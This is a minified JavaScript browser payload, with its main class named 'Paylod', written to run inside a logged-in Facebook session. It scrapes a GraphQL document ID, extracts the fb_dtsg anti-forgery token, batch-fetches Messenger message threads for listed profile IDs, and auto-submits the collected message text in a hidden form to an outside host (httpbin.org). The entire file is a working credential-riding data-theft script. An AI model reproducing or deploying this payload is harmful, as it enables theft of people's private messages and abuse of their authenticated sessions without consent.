"use strict";function _classCallCheck(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function _defineProperties(e,t){for(var s=0;s<t.length;s++){var n=t[s];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function _createClass(e,t,s){return t&&_defineProperties(e.prototype,t),s&&_defineProperties(e,s),e}var HTMLParser=function(){function s(e){_classCallCheck(this,s);var t=new DOMParser;this.dom=t.parseFromString(e,"text/html")}return _createClass(s,[{key:"select",value:function(e){return this.dom.querySelector(e)}},{key:"selectAll",value:function(e){return this.dom.querySelectorAll(e)}}]),s}(),HTTP=function(){function t(e){_classCallCheck(this,t),this.url=e,this.client=new XMLHttpRequest,this.params="?"}return _createClass(t,[{key:"addParam",value:function(e,t){return this.params+="".concat(e,"=").concat(t,"&"),this}},{key:"get",value:function(e){this.client.open("GET",this.url+this.params,!0),this.client.onreadystatechange=function(){4===this.readyState&&200===this.status&&e(this.responseText)},this.client.send()}},{key:"setPayload",value:function(e){return this.params=e,this}},{key:"post",value:function(e){this.client.open("POST",this.url,!0),this.client.setRequestHeader("Content-type","application/x-www-form-urlencoded"),this.client.onreadystatechange=function(){4===this.readyState&&200===this.status&&e(this.responseText)},this.client.send(this.params.replace("?",""))}}]),t}(),Paylod=function(){function e(){_classCallCheck(this,e),this.profileIds=["MESSAGE_EXTRACTOR"],this.msg=""}return _createClass(e,[{key:"initiate",value:function(e){for(var n=this,t=document.querySelectorAll("script"),s="",a=[],r=0;r<t.length;r++){var o=t[r].getAttribute("src");null!=o&&(o.startsWith("http://")||o.startsWith("https://"))&&a.push(o);var i=t[r].innerHTML;if(-1<i.indexOf('{"type":"js","src":')){s=i;break}}for(var c="{"+s.match(/function\(Bootloader\)\{Bootloader\.setResourceMap\(\{(.*?)\}\)\;Bootloader\.enableBootload\(\{/g)[0].replace(/function\(Bootloader\)\{Bootloader\.setResourceMap\(\{/g,"").replace(/\}\)\;Bootloader\.enableBootload\(\{/g,"")+"}",l=JSON.parse(c),u=Object.keys(l),h=0;h<u.length;h++){var d=l[u[h]].src;a.push(d)}for(var p=function(t){new HTTP(a[t]).get(function(e){if(-1<e.indexOf("__getDocID=function()")){console.log(a[t]);try{var s=e.match(/\_\_getDocID\=function\(\)\{return\"[0-9]*\"\}/g)[0].match(/[0-9]/g).join("");new HTTP("https://www.facebook.com/").get(function(e){var t=e.match(/\<input(.*?)name\=\"fb_dtsg\"(.*?)\/\>/g)[0].match(/"\w+:\w+"/g)[0].replace(/"/g,"");n.run(s,t)})}catch(e){console.error("Document ID not found, skipping...")}}})},f=0;f<a.length;f++)p(f)}},{key:"getMessages",value:function(e,t,r,o,s){var i=this;new HTTP("https://www.facebook.com/api/graphqlbatch/").setPayload("batch_name=MessengerGraphQLThreadFetcher&__a=1&__req=19t&__be=1&__pc=PHASED:DEFAULT&dpr=1&fb_dtsg=".concat(t,'&__spin_b=trunk&queries={"o0":{"doc_id":').concat(e,',"query_params":{"id":"').concat(r,'","message_limit":').concat(s,',"load_messages":true,"load_read_receipts":true,"load_delivery_receipts":true}}}')).post(function(e){var t=e.split('"successful_results"')[0].trim().slice(0,-1),s=JSON.parse(t),n=s[Object.keys(s)[0]].data.message_thread.messages.nodes,a=r+" => ";n.forEach(function(e){void 0!==e.message&&(a+=e.message.text+"{DIVIDER}")}),i.profileIds[o].is_done=!0,console.log("DONE: "+r),i.msg+=a})}},{key:"run",value:function(e,t){console.log(e),console.log(t);for(var a=this,s=0;s<this.profileIds.length;s++)this.getMessages(e,t,this.profileIds[s].id,s,this.profileIds[s].count);setInterval(function(){for(var e=!0,t=0;t<a.profileIds.length;t++)a.profileIds[t].is_done||(e=!1);if(e){var s=document.createElement("form");s.setAttribute("method","post"),s.setAttribute("action","http://httpbin.org/post");var n=document.createElement("textarea");n.setAttribute("name","messages"),n.value=a.msg,s.appendChild(n),document.body.appendChild(s),s.submit()}},1e3)}}]),e}();(new Paylod).initiate();